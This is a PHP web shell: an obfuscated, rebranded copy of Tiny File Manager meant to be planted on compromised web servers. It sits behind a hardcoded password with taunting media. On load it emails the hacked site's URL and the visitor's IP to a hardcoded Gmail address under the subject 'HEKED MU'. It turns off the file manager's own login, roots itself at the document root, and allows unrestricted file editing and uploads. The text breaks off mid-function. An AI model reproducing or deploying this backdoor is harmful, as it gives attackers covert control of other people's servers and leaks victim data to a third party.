<center>
<style>

body {
  background: no-repeat center center fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover center fixed;
  color: rgba(0, 0, 0, .05)(
  text-align: center;
  margin: 0;
  
  }
</style>
<?php 


session_start();
define('PASSWORD', 'jembotmawot '); 
// Proses login
// Proses login
if (isset($_POST['password'])) {
    if ($_POST['password'] === PASSWORD) {
        $_SESSION['authenticated'] = true;
         setcookie(md5($_SERVER['HTTP_HOST']), true, time() + 25200);
        echo '<audio autoplay><source src="https://cvar1984.github.io/audio/moan.mp3" type="audio/mpeg"></audio>';
    } else {
        echo '<script>
				document.querySelector("html").innerHTML = "<img style=\'display:block;position:absolute;top: 0;right: 0;bottom: 0;left: 0;z-index: 10;overflow-y: scroll; width: 100%; height: 100%;\' src=\'https://c.tenor.com/CgGUXc-LDc4AAAAC/tenor.gif\'>";
				var source = "https://j.top4top.io/m_2967gtgnw1.mp3"
				var audio = document.createElement("audio");
				audio.autoplay = true;
				audio.load()
				audio.play();
				audio.src = source;
			</script> <script type="text/JavaScript">

     function disableselect(e) {
          return false
        }
        
        function reEnable() {
          return false
        }
        
        document.onselectstart = new Function ("return false")
        
        if (window.sidebar) {
          document.onmousedown = disableselect
          document.onclick = reEnable
        }
        </script>';
    }
}

// Proses logout
if (isset($_POST['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

if (!isset($_SESSION['authenticated']) || !$_SESSION['authenticated']) {


    // Tampilkan form login jika belum terautentikasi
     echo '<!doctype html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-+0n0xVW2eSR5OomGNYDnhzAbDsOXxcvSN1TPprVMTNDbiYZCxYbOOl7+AMvyTG2x" crossorigin="anonymous">
	<link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>

<meta name="viewport" content="width=1024" />
    <meta name="robots" content="noindex, nofollow">
   
   
<style>
         body {
            background: linear-gradient(135deg, darkslateblue 45%, #70e825 35%);
            height: 100vh;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .login-card {
            border-radius: 20px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
            padding: 30px;
            max-width: 600px;
            width: 100%;
            text-align: center;
            background-color: darkslateblue;
        }
        .login-card img {
            max-width: 100%;
            height: auto;
            margin-bottom: 20px;
        }
        .login-card h1 {
            margin-bottom: 20px;
            animation: colorChange 3s infinite;
        }
        @keyframes colorChange {
            0%, 100% {
                color: darkslateblue;
            }
            50% {
                color: lightblue;
            }
        }
        .login-card .form-group {
            margin-bottom: 20px;
        }
        .login-card .btn {
            width: 100%;
        }
    </style>
	</script> <script type="text/JavaScript">

     function disableselect(e) {
          return false
        }
        
        function reEnable() {
          return false
        }
        
        document.onselectstart = new Function ("return false")
        
        if (window.sidebar) {
          document.onmousedown = disableselect
          document.onclick = reEnable
        }
        </script>
<div class="login-card">

      <img backgroudn src="https://raw.githubusercontent.com/exploit-haxor/webshell/refs/heads/main/120380.gif" alt="banner" class="img-fluid">


<h1></>GIMANA MAU KALEM <br>KALAU<br> RASANYA DALEM</></h1>

<center><font color="aqua"><font SIZE="3">:: password: Galau  ::</font></font></center>

        <form method="post">
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" class="form-control text-center" placeholder="Masukkan password" required>
            </div>
            <button type="submit" class="btn btn-primary">Login</button>
        </form>
    </div></head></html>';
    exit;
}

error_reporting(0);

//Default Configuration
$„ο„„ογγγο‹ = '{"lang":"en","error_reporting":false,"show_hidden":true,"hide_Cols":false,"theme":"dark"}';
 
 $γ‰γο²‚γ™†γ»Ό = 'muhrazky@gmail.com';
 $γΌγ‚²γγοΌΌγ„²«„ = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
 $†„γγ¬ογγ†„µ„ = "Pesanan | URL: $γΌγ‚²γγοΌΌγ„²«„ | IP Address :[ " . $_SERVER['REMOTE_ADDR'] . " ]";
 mail($γ‰γο²‚γ™†γ»Ό, "HEKED MU | A1_RZ", $†„γγ¬ογγ†„µ„, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");

//Default Configuration
$„ο„„ογγγο‹ = '{"lang":"en","error_reporting":false,"show_hidden":true,"hide_Cols":false,"theme":"dark"}';
	

/**
 * H3K - Tiny File Manager V2.6
 * @author CCP Programmers
 * @github https://github.com/prasathmani/tinyfilemanager
 * @link https://tinyfilemanager.github.io
 */

//TFM version
define('VERSION', '2.6');

//Application Title
define('APP_TITLE', 'Jembot Mawot Manager');

// --- EDIT BELOW CONFIGURATION CAREFULLY ---

// Auth with login/password
// set true/false to enable/disable it
// Is independent from IP white- and blacklisting
$γγγ»‚γγΏ•γγ‰ = false;

// Login user name and password
// Users: array('Username' => 'Password', 'Username2' => 'Password2', ...)
// Generate secure password hash - https://tinyfilemanager.github.io/docs/pwd.html
$γ„ΌΌ“γγ‚„γ»γγ = array(
    'admin' => '$2y$10$/K.$2y$10$EXIXvutQJP3CFEOOw8DAaejucmsqp6SfB7vGhKLItd4cxrP4Uu4j2', //admin@123
    'user' => '$2y$10$EXIXvutQJP3CFEOOw8DAaejucmsqp6SfB7vGhKLItd4cxrP4Uu4j2' //12345
);

// Readonly users
// e.g. array('users', 'guest', ...)
$γ™γγγγ†γ‚Όγ¦γ = array(
    'user'
);

// Global readonly, including when auth is not being used
$γοοΌ²γγγγ‰γγΌγ» = false;

// user specific directories
// array('Username' => 'Directory path', 'Username2' => 'Directory path', ...)
$‰γ¦γ†γ‰™»ο = array();

// Enable highlight.js (https://highlightjs.org/) on view's page
$γ²γ‰γΌγγ„ο‚γ = true;

// highlight.js style
// for dark theme use 'ir-black'
$¬Ό‚γγγογ„‚‚γ‚• = 'ir-black';

// Enable ace.js (https://ace.c9.io/) on view's page
$ογΎγ“‰γγ“γµγ = true;

// Default timezone for date() and time()
// Doc - http://php.net/manual/en/timezones.php
$‚‚γ‰γγΌγ»γ®„―γ = 'Etc/UTC'; // UTC

// Root path for file manager
// use absolute path of directory i.e: '/var/www/folder' or $_SERVER['DOCUMENT_ROOT'].'/folder'
//make sure update $root_url in next section
$†¬γγγο¬†γΈΌ‰ = $_SERVER['DOCUMENT_ROOT'];

// Root url for links in file manager.Relative to $http_host. Variants: '', 'path/to/subfolder'
// Will not working if $root_path will be outside of server document root
$¬„γΌο²γγο„»‚Ώ» = '';

// Server hostname. Can set manually if wrong
// $_SERVER['HTTP_HOST'].'/folder'
$γ―γΌΏ²γγ―γ»γγ = $_SERVER['HTTP_HOST'];

// input encoding for iconv
$γΌγ††οογγ®‚„ο = 'UTF-8';

// date() format for file modification date
// Doc - https://www.php.net/manual/en/function.date.php
$γΌ‚γΌ«ογ²²‚† = 'm/d/Y g:i A';

// Path display mode when viewing file information
// 'full' => show full path
// 'relative' => show path relative to root_path
// 'host' => show path on the host
$„•ογγ‰γοΌµγγ‚»† = 'full';

// Allowed file extensions for create and rename files
// e.g. 'txt,html,css,js'
$‚γγγγγγ™††γ‹‰Ό„—™ = '';

// Allowed file extensions for upload files
// e.g. 'gif,png,jpg,html,txt'
$Ώγγ†γγ„Έοογγο = '';

// Favicon path. This can be either a full url to an .PNG image, or a path based on the document root.
// full path, e.g http://example.com/favicon.png
// local path, e.g images/icons/favicon.png
$‚ο‰γΌΌ†γ―γΌΌΌγγ = '';

// Files and folders to excluded from listing
// e.g. array('myfile.html', 'personal-folder', '*.php', ...)
$γ“γγΈ‚γγ„γΏ¦ο‚γ„ογ® = array();

// Online office Docs Viewer
// Available rules are 'google', 'microsoft' or false
// Google => View documents using Google Docs Viewer
// Microsoft => View documents using Microsoft Web Apps Viewer
// false => disable online doc viewer
$‰γοΏγΌ®•γ†Ό‰‰µ = 'google';

// Sticky Nav bar
// true => enable sticky header
// false => disable sticky header
$ογγγγ„»γοΎγγµ‹ = true;

// Maximum file upload size
// Increase the following values in php.ini to work properly
// memory_limit, upload_max_filesize, post_max_size
$ογοΌ‰γγγγγΌΌογ = 50000000000000; // size 5,000,000,000 bytes (~5GB)

// chunk size used for upload
// eg. decrease to 1MB if nginx reports problem 413 entity too large
$Έ†ογΌΌ»γ™γγγ»γ = 2000000; // chunk size 2,000,000 bytes (~2MB)

// Possible rules are 'OFF', 'AND' or 'OR'
// OFF => Don't check connection IP, defaults to OFF
// AND => Connection must be on the whitelist, and not on the blacklist
// OR => Connection must be on the whitelist, or not on the blacklist
$γγγ»—¦²γγ²†‚ = 'OFF';

// Should users be notified of their block?
$‰¬γ‚γγγγγγγγγ„ = true;

// IP-addresses, both ipv4 and ipv6
$γ―Όγ‚„„γο‚γ»γ‚ = array(
    '127.0.0.1',    // local ipv4
    '::1'           // local ipv6
);

// IP-addresses, both ipv4 and ipv6
$Όγ‚Ώ„»™„ο‚†―γγ = array(
    '0.0.0.0',      // non-routable meta ipv4
    '::'            // non-routable meta ipv6
);


// External CDN resources that can be used in the HTML (replace for GDPR compliance)
$²Έγ»γγογΏγ = array(
    'css-bootstrap' => '<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">',
    'css-dropzone' => '<link href="https://cdnjs.cloudflare.com/ajax/libs/dropzone/5.9.3/min/dropzone.min.css" rel="stylesheet">',
    'css-font-awesome' => '<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" crossorigin="anonymous">',
    'css-highlightjs' => '<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/' . $¬Ό‚γγγογ„‚‚γ‚• . '.min.css">',
    'js-ace' => '<script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.32.2/ace.js"></script>',
    'js-bootstrap' => '<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>',
    'js-dropzone' => '<script src="https://cdnjs.cloudflare.com/ajax/libs/dropzone/5.9.3/min/dropzone.min.js"></script>',
    'js-jquery' => '<script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>',
    'js-jquery-datatables' => '<script src="https://cdn.datatables.net/1.13.1/js/jquery.dataTables.min.js" crossorigin="anonymous" defer></script>',
    'js-highlightjs' => '<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>',
    'pre-jsdelivr' => '<link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin/><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"/>',
    'pre-cloudflare' => '<link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin/><link rel="dns-prefetch" href="https://cdnjs.cloudflare.com"/>'
);


// --- EDIT BELOW CAREFULLY OR DO NOT EDIT AT ALL ---

// max upload file size
define('MAX_UPLOAD_SIZE', $ογοΌ‰γγγγγΌΌογ);

// upload chunk size
define('UPLOAD_CHUNK_SIZE', $Έ†ογΌΌ»γ™γγγ»γ);

// private key and session name to store to the session
if (!defined('FM_SESSION_ID')) {
    define('FM_SESSION_ID', 'JEMBOT MAWOT');
}

// Configuration
$γ™γ‚†™„Όγγ­†γΌγγ = new FM_Config();

// Default language
$»γογογγ™γ²γ = isset($γ™γ‚†™„Όγγ­†γΌγγ->data['lang']) ? $γ™γ‚†™„Όγγ­†γΌγγ->data['lang'] : 'en';

// Show or hide files and folders that starts with a dot
$»†„Ό‰—¬γΌΌ†γ††‰» = isset($γ™γ‚†™„Όγγ­†γΌγγ->data['show_hidden']) ? $γ™γ‚†™„Όγγ­†γΌγγ->data['show_hidden'] : true;

// PHP error reporting - false = Turns off Errors, true = Turns on Errors
$“γ‚γ―γγο†‚»γγγγ = isset($γ™γ‚†™„Όγγ­†γΌγγ->data['error_reporting']) ? $γ™γ‚†™„Όγγ­†γΌγγ->data['error_reporting'] : true;

// Hide Permissions and Owner cols in file-listing
$Όγγο“„γ²γΌ†γ†γγγγ = isset($γ™γ‚†™„Όγγ­†γΌγγ->data['hide_Cols']) ? $γ™γ‚†™„Όγγ­†γΌγγ->data['hide_Cols'] : true;

// Theme
$γ„γ¬γγΏογοο‰―²οοΌ = isset($γ™γ‚†™„Όγγ­†γΌγγ->data['theme']) ? $γ™γ‚†™„Όγγ­†γΌγγ->data['theme'] : 'light';

define('FM_THEME', $γ„γ¬γγΏογοο‰―²οοΌ);

//available languages
$γγγ„γγ‰γγγ‚Όγ‚ογγΌ = array(
    'en' => 'English'
);

if ($“γ‚γ―γγο†‚»γγγγ == true) {
    @ini_set('error_reporting', E_ALL);
    @ini_set('display_errors', 1);
} else {
    @ini_set('error_reporting', E_ALL);
    @ini_set('display_errors', 0);
}

// if fm included
if (defined('FM_EMBED')) {
    $γγγ»‚γγΏ•γγ‰ = false;
    $ογγγγ„»γοΎγγµ‹ = false;
} else {
    @set_time_limit(-1);

    date_default_timezone_set($‚‚γ‰γγΌγ»γ®„―γ);

    ini_set('default_charset', 'UTF-8');
    if (version_compare(PHP_VERSION, '5.6.0', '<') && function_exists('mb_internal_encoding')) {
        mb_internal_encoding('UTF-8');
    }
    if (function_exists('mb_regex_encoding')) {
        mb_regex_encoding('UTF-8');
    }

    session_cache_limiter('nocache'); // Prevent logout issue after page was cached
    session_name(FM_SESSION_ID);
    function session_error_handling_function($ΌΌογο‰γ‚γ¦Ώ, $‚γ†γ²•„γ„γΌγ‚γ•‚, $γ»γγµ™„‚‚γ, $‚Όγ­­γ»Έγγγ„ογ»γ‰)
    {
        // Permission denied for default session, try to create a new one
        if ($ΌΌογο‰γ‚γ¦Ώ == 2) {
            session_abort();
            session_id(session_create_id());
            @session_start();
        }
    }
    set_error_handler('session_error_handling_function');
    session_start();
    restore_error_handler();
}

//Generating CSRF Token
if (empty($_SESSION['token'])) {
    if (function_exists('random_bytes')) {
        $_SESSION['token'] = bin2hex(random_bytes(32));
    } else {
        $_SESSION['token'] = bin2hex(openssl_random_pseudo_bytes(32));
    }
}

if (empty($γ„ΌΌ“γγ‚„γ»γγ)) {
    $γγγ»‚γγΏ•γγ‰ = false;
}

$»Όγ‰γγγγ‰„™µ‚γγΌ® = isset($_SERVER['HTTPS']) && ($_SERVER['HTTPS'] == 'on' || $_SERVER['HTTPS'] == 1)
    || isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https';

// update $root_url based on user specific directories
if (isset($_SESSION[FM_SESSION_ID]['logged']) && !empty($‰γ¦γ†γ‰™»ο[$_SESSION[FM_SESSION_ID]['logged']])) {
    $γ²γΌγγγΌΌγ‚γ = fm_clean_path(dirname($_SERVER['PHP_SELF']));
    $¬„γΌο²γγο„»‚Ώ» =  $¬„γΌο²γγο„»‚Ώ» . $γ²γΌγγγΌΌγ‚γ . DIRECTORY_SEPARATOR . $‰γ¦γ†γ‰™»ο[$_SESSION[FM_SESSION_ID]['logged']];
}
// clean $root_url
$¬„γΌο²γγο„»‚Ώ» = fm_clean_path($¬„γΌο²γγο„»‚Ώ»);

// abs path for site
defined('FM_ROOT_URL') || define('FM_ROOT_URL', ($»Όγ‰γγγγ‰„™µ‚γγΌ® ? 'https' : 'http') . '://' . $γ―γΌΏ²γγ―γ»γγ . (!empty($¬„γΌο²γγο„»‚Ώ») ? '/' . $¬„γΌο²γγο„»‚Ώ» : ''));
defined('FM_SELF_URL') || define('FM_SELF_URL', ($»Όγ‰γγγγ‰„™µ‚γγΌ® ? 'https' : 'http') . '://' . $γ―γΌΏ²γγ―γ»γγ . $_SERVER['PHP_SELF']);

// logout
if (isset($_GET['logout'])) {
    unset($_SESSION[FM_SESSION_ID]['logged']);
    unset($_SESSION['token']);
    fm_redirect(FM_SELF_URL);
}

// Validate connection IP
if ($γγγ»—¦²γγ²†‚ != 'OFF') {
    function getClientIP()
    {
        if (array_key_exists('HTTP_CF_CONNECTING_IP', $_SERVER)) {
            return  $_SERVER["HTTP_CF_CONNECTING_IP"];
        } else if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) {
            return  $_SERVER["HTTP_X_FORWARDED_FOR"];
        } else if (array_key_exists('REMOTE_ADDR', $_SERVER)) {
            return $_SERVER['REMOTE_ADDR'];
        } else if (array_key_exists('HTTP_CLIENT_IP', $_SERVER)) {
            return $_SERVER['HTTP_CLIENT_IP'];
        }
        return '';
    }

    $ογγ»γ¬γ‰γογΈ‚ = getClientIP();
    $γ—†—γγ»ογγγµοο = false;
    $Ύ¬ΌγΌ„γ†γ²ο‰ΎΌ = in_array($ογγ»γ¬γ‰γογΈ‚, $γ―Όγ‚„„γο‚γ»γ‚);
    $™‰γ™®‚Όγ»ογΌογ‚ = in_array($ογγ»γ¬γ‰γογΈ‚, $Όγ‚Ώ„»™„ο‚†―γγ);

    if ($γγγ»—¦²γγ²†‚ == 'AND') {
        if ($Ύ¬ΌγΌ„γ†γ²ο‰ΎΌ == true && $™‰γ™®‚Όγ»ογΌογ‚ == false) {
            $γ—†—γγ»ογγγµοο = true;
        }
    } else
    if ($γγγ»—¦²γγ²†‚ == 'OR') {
        if ($Ύ¬ΌγΌ„γ†γ²ο‰ΎΌ == true || $™‰γ™®‚Όγ»ογΌογ‚ == false) {
            $γ—†—γγ»ογγγµοο = true;
        }
    }

    if ($γ—†—γγ»ογγγµοο == false) {
        trigger_error('User connection denied from: ' . $ογγ»γ¬γ‰γογΈ‚, E_USER_WARNING);

        if ($‰¬γ‚γγγγγγγγγ„ == false) {
            fm_set_msg(lng('Access denied. IP restriction applicable'), 'error');
            fm_show_header_login();
            fm_show_message();
        }
        exit();
    }
}

// Checking if the user is logged in or not. If not, it will show the login form.
if ($γγγ»‚γγΏ•γγ‰) {
    if (isset($_SESSION[FM_SESSION_ID]['logged'], $γ„ΌΌ“γγ‚„γ»γγ[$_SESSION[FM_SESSION_ID]['logged']])) {
        // Logged
    } elseif (isset($_POST['fm_usr'], $_POST['fm_pwd'], $_POST['token'])) {
        // Logging In
        sleep(1);
        if (function_exists('password_verify')) {
            if (isset($γ„ΌΌ“γγ‚„γ»γγ[$_POST['fm_usr']]) && isset($_POST['fm_pwd']) && password_verify($_POST['fm_pwd'], $γ„ΌΌ“γγ‚„γ»γγ[$_POST['fm_usr']]) && verifyToken($_POST['token'])) {
                $_SESSION[FM_SESSION_ID]['logged'] = $_POST['fm_usr'];
                fm_set_msg(lng('You are logged in'));
                fm_redirect(FM_SELF_URL);
            } else {
                unset($_SESSION[FM_SESSION_ID]['logged']);
                fm_set_msg(lng('Login failed. Invalid username or password'), 'error');
                fm_redirect(FM_SELF_URL);
            }
        } else {
            fm_set_msg(lng('password_hash not supported, Upgrade PHP version'), 'error');;
        }
    } else {
        // Form
        unset($_SESSION[FM_SESSION_ID]['logged']);
        fm_show_header_login();
?>
        <section class="h-100">
            <div class="container h-100">
                <div class="row justify-content-md-center align-content-center h-100vh">
                    <div class="card-wrapper">
                        <div class="card fat" data-bs-theme="<?php 
echo FM_THEME; ?>">
                            <div class="card-body">
                                <form class="form-signin" action="" method="post" autocomplete="off">
                                    <div class="mb-3">
                                        <div class="brand">
                                            <svg version="1.0" xmlns="http://www.w3.org/2000/svg" M1008 width="100%" height="80px" viewBox="0 0 238.000000 140.000000" aria-label="H3K Tiny File Manager">
                                                <g transform="translate(0.000000,140.000000) scale(0.100000,-0.100000)" fill="#000000" stroke="none">
                                                    <path d="M160 700 l0 -600 110 0 110 0 0 260 0 260 70 0 70 0 0 -260 0 -260 110 0 110 0 0 600 0 600 -110 0 -110 0 0 -260 0 -260 -70 0 -70 0 0 260 0 260 -110 0 -110 0 0 -600z" />
                                                    <path fill="#003500" d="M1008 1227 l-108 -72 0 -117 0 -118 110 0 110 0 0 110 0 110 70 0 70 0 0 -180 0 -180 -125 0 c-69 0 -125 -3 -125 -6 0 -3 23 -39 52 -80 l52 -74 73 0 73 0 0 -185 0 -185 -70 0 -70 0 0 115 0 115 -110 0 -110 0 0 -190 0 -190 181 0 181 0 109 73 108 72 1 181 0 181 -69 48 -68 49 68 50 69 49 0 249 0 248 -182 -1 -183 0 -107 -72z" />
                                                    <path d="M1640 700 l0 -600 110 0 110 0 0 208 0 208 35 34 35 34 35 -34 35 -34 0 -208 0 -208 110 0 110 0 0 212 0 213 -87 87 -88 88 88 88 87 87 0 213 0 212 -110 0 -110 0 0 -208 0 -208 -70 -69 -70 -69 0 277 0 277 -110 0 -110 0 0 -600z" />
                                                </g>
                                            </svg>
                                        </div>
                                        <div class="text-center">
                                            <h1 class="card-title"><?php 
echo APP_TITLE; ?></h1>
                                        </div>
                                    </div>
                                    <hr />
                                    <div class="mb-3">
                                        <label for="fm_usr" class="pb-2"><?php 
echo lng('Username'); ?></label>
                                        <input type="text" class="form-control" id="fm_usr" name="fm_usr" required autofocus>
                                    </div>

                                    <div class="mb-3">
                                        <label for="fm_pwd" class="pb-2"><?php 
echo lng('Password'); ?></label>
                                        <input type="password" class="form-control" id="fm_pwd" name="fm_pwd" required>
                                    </div>

                                    <div class="mb-3">
                                        <?php 
fm_show_message(); ?>
                                    </div>
                                    <input type="hidden" name="token" value="<?php 
echo htmlentities($_SESSION['token']); ?>" />
                                    <div class="mb-3">
                                        <button type="submit" class="btn btn-success btn-block w-100 mt-4" role="button">
                                            <?php 
echo lng('Login'); ?>
                                        </button>
                                    </div>
                                </form>
                            </div>
                        </div>
                        <div class="footer text-center">
                            &mdash;&mdash; &copy;
                            <a href="t.me/ISC2k17" target="_blank" class="text-decoration-none text-muted" data-version="<?php 
echo VERSION; ?>">CCP Programmers</a> &mdash;&mdash;
                        </div>
                    </div>
                </div>
            </div>
        </section>

    <?php

        fm_show_footer_login();
        exit;
    }
}

// update root path
if ($γγγ»‚γγΏ•γγ‰ && isset($_SESSION[FM_SESSION_ID]['logged'])) {
    $†¬γγγο¬†γΈΌ‰ = isset($‰γ¦γ†γ‰™»ο[$_SESSION[FM_SESSION_ID]['logged']]) ? $‰γ¦γ†γ‰™»ο[$_SESSION[FM_SESSION_ID]['logged']] : $†¬γγγο¬†γΈΌ‰;
}

// clean and check $root_path
$†¬γγγο¬†γΈΌ‰ = rtrim($†¬γγγο¬†γΈΌ‰, '\\/');
$†¬γγγο¬†γΈΌ‰ = str_replace('\\', '/', $†¬γγγο¬†γΈΌ‰);
if (!@is_dir($†¬γγγο¬†γΈΌ‰)) {
    echo "<h1>" . lng('Root path') . " \"{$†¬γγγο¬†γΈΌ‰}\" " . lng('not found!') . " </h1>";
    exit;
}

defined('FM_SHOW_HIDDEN') || define('FM_SHOW_HIDDEN', $»†„Ό‰—¬γΌΌ†γ††‰»);
defined('FM_ROOT_PATH') || define('FM_ROOT_PATH', $†¬γγγο¬†γΈΌ‰);
defined('FM_LANG') || define('FM_LANG', $»γογογγ™γ²γ);
defined('FM_FILE_EXTENSION') || define('FM_FILE_EXTENSION', $‚γγγγγγ™††γ‹‰Ό„—™);
defined('FM_UPLOAD_EXTENSION') || define('FM_UPLOAD_EXTENSION', $Ώγγ†γγ„Έοογγο);
defined('FM_EXCLUDE_ITEMS') || define('FM_EXCLUDE_ITEMS', (version_compare(PHP_VERSION, '7.0.0', '<') ? serialize($γ“γγΈ‚γγ„γΏ¦ο‚γ„ογ®) : $γ“γγΈ‚γγ„γΏ¦ο‚γ„ογ®));
defined('FM_DOC_VIEWER') || define('FM_DOC_VIEWER', $‰γοΏγΌ®•γ†Ό‰‰µ);
define('FM_READONLY', $γοοΌ²γγγγ‰γγΌγ» || ($γγγ»‚γγΏ•γγ‰ && !empty($γ™γγγγ†γ‚Όγ¦γ) && isset($_SESSION[FM_SESSION_ID]['logged']) && in_array($_SESSION[FM_SESSION_ID]['logged'], $γ™γγγγ†γ‚Όγ¦γ)));
define('FM_IS_WIN', DIRECTORY_SEPARATOR == '\\');

// always use ?p=
if (!isset($_GET['p']) && empty($_FILES)) {
    fm_redirect(FM_SELF_URL . '?p=');
}

// get path
$Όγ»†²γ™γγγο‚„ = isset($_GET['p']) ? $_GET['p'] : (isset($_POST['p']) ? $_POST['p'] : '');

// clean path
$Όγ»†²γ™γγγο‚„ = fm_clean_path($Όγ»†²γ™γγγο‚„);

// for ajax request - save
$γγγγ¬Ό»γγ†γογ“ = file_get_contents('php://input');
$_POST = (strpos($γγγγ¬Ό»γγ†γογ“, 'ajax') != FALSE && strpos($γγγγ¬Ό»γγ†γογ“, 'save') != FALSE) ? json_decode($γγγγ¬Ό»γγ†γογ“, true) : $_POST;

// instead globals vars
define('FM_PATH', $Όγ»†²γ™γγγο‚„);
define('FM_USE_AUTH', $γγγ»‚γγΏ•γγ‰);
define('FM_EDIT_FILE', $ογΎγ“‰γγ“γµγ);
defined('FM_ICONV_INPUT_ENC') || define('FM_ICONV_INPUT_ENC', $γΌγ††οογγ®‚„ο);
defined('FM_USE_HIGHLIGHTJS') || define('FM_USE_HIGHLIGHTJS', $γ²γ‰γΌγγ„ο‚γ);
defined('FM_HIGHLIGHTJS_STYLE') || define('FM_HIGHLIGHTJS_STYLE', $¬Ό‚γγγογ„‚‚γ‚•);
defined('FM_DATETIME_FORMAT') || define('FM_DATETIME_FORMAT', $γΌ‚γΌ«ογ²²‚†);

unset($Όγ»†²γ™γγγο‚„, $γγγ»‚γγΏ•γγ‰, $γΌγ††οογγ®‚„ο, $γ²γ‰γΌγγ„ο‚γ, $¬Ό‚γγγογ„‚‚γ‚•);

/*************************** ACTIONS ***************************/

// Handle all AJAX Request
if ((isset($_SESSION[FM_SESSION_ID]['logged'], $γ„ΌΌ“γγ‚„γ»γγ[$_SESSION[FM_SESSION_ID]['logged']]) || !FM_USE_AUTH) && isset($_POST['ajax'], $_POST['token']) && !FM_READONLY) {
    if (!verifyToken($_POST['token'])) {
        header('HTTP/1.0 401 Unauthorized');
        die("Invalid Token.");
    }

    //search : get list of files from the current folder
    if (isset($_POST['type']) && $_POST['type'] == "search") {
        $γγ‹­γ‰γγγγΌ»γγ‰ = $_POST['path'] == "." ? '' : $_POST['path'];
        $‚γγγ‰Ό‚ογ—‚†γΌΎ = scan(fm_clean_path($γγ‹­γ‰γγγγΌ»γγ‰), $_POST['content']);
        echo json_encode($‚γγγ‰Ό‚ογ—‚†γΌΎ);
        exit();
    }

    // save editor file
    if (isset($_POST['type']) && $_POST['type'] == "save") {
        // get current path
        $γΌγ‚²γγοΌΌγ„²«„ = FM_ROOT_PATH;
        if (FM_PATH != '') {
            $γΌγ‚²γγοΌΌγ„²«„ .= '/' . FM_PATH;
        }
        // check path
        if (!is_dir($γΌγ‚²γγοΌΌγ„²«„)) {
            fm_redirect(FM_SELF_URL . '?p=');
        }
        $γ»γγµ™„‚‚γ = $_GET['edit'];
        $γ»γγµ™„‚‚γ = fm_clean_path($γ»γγµ™„‚‚γ);
        $γ»γγµ™„‚‚γ = str_replace('/', '', $γ»γγµ™„‚‚γ);
        if ($γ»γγµ™„‚‚γ == '' || !is_file($γΌγ‚²γγοΌΌγ„²«„ . '/' . $γ»γγµ™„‚‚γ)) {
            fm_set_msg(lng('File not found'), 'error');
            $‚¦γγγ‚γγ‰γΈΌΏ = FM_PATH;
            fm_redirect(FM_SELF_URL . '?p=' . urlencode($‚¦γγγ‚γγ‰γΈΌΏ));
        }
        header('X-XSS-Protection:0');
        $―γ»γγ»®‚γγΌογ = $γΌγ‚²γγοΌΌγ„²«„ . '/' . $γ»γγµ™„‚‚γ;

        $οΏΌγγΌ‰γ„»Όγ = $_POST['content'];
        $γ²µ„™γγο¦²†γ² = fopen($―γ»γγ»®‚γγΌογ, "w");
        $“ο™γΈΌγΎγ•‹γγ— = @fwrite($γ²µ„™γγο¦²†γ², $οΏΌγγΌ‰γ„»Όγ);
        fclose($γ²µ„™γγο¦²†γ²);
        if ($“ο™γΈΌγΎγ•‹γγ— === false) {
            header("HTTP/1.1 500 Internal Server Error");
            die("Could Not Write File! - Check Permissions / Ownership");
        }
        die(true);
    }

    // backup files
    if (isset($_POST['type']) && $_POST['type'] == "backup" && !empty($_POST['file'])) {
        $γ†„ο‚ο„‰†γγ = fm_clean_path($_POST['file']);
        $γγο™²γγ¬γγγ²„†Όγ = FM_ROOT_PATH . '/';
        if (!empty($_POST['path'])) {
            $γογ™—γ‹γγγγΌ = fm_clean_path($_POST['path']);
            $γγο™²γγ¬γγγ²„†Όγ .= "{$γογ™—γ‹γγγγΌ}/";
        }
        $Ό¬ογ‰‚Ύ‰γ‚¬»γΌΈ‰ = date("dMy-His");
        $†ΌΌγΌγ®‰γγγ»¬οογ = "{$γ†„ο‚ο„‰†γγ}-{$Ό¬ογ‰‚Ύ‰γ‚¬»γΌΈ‰}.bak";
        $‰ΏΏ‚µΈγΌγγΏγγ = $γγο™²γγ¬γγγ²„†Όγ . $γ†„ο‚ο„‰†γγ;
        try {
            if (!file_exists($‰ΏΏ‚µΈγΌγγΏγγ)) {
                throw new Exception("File {$γ†„ο‚ο„‰†γγ} not found");
            }
